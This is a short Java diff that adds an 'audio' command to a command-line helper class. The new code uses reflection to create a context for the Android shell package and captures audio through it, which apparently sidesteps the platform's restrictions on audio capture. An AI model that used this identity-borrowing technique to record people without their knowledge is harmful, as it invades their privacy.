@@ -38,6 +38,13 @@ public final class Aiuto {
             System.out.println(sfondo(larghezza));
             return;
         }
+        if (comando.equals("audio")) {
+            Object sistema = contesto();
+            Context shell = (Context) sistema.getClass().getMethod("createPackageContext", String.class, int.class)
+                    .invoke(sistema, "com.android.shell", 0);
+            Audio.cattura(shell);
+            return;
+        }
         if (comando.equals("appunti-sensibili")) {
             System.out.println(appuntiSensibili());
             return;
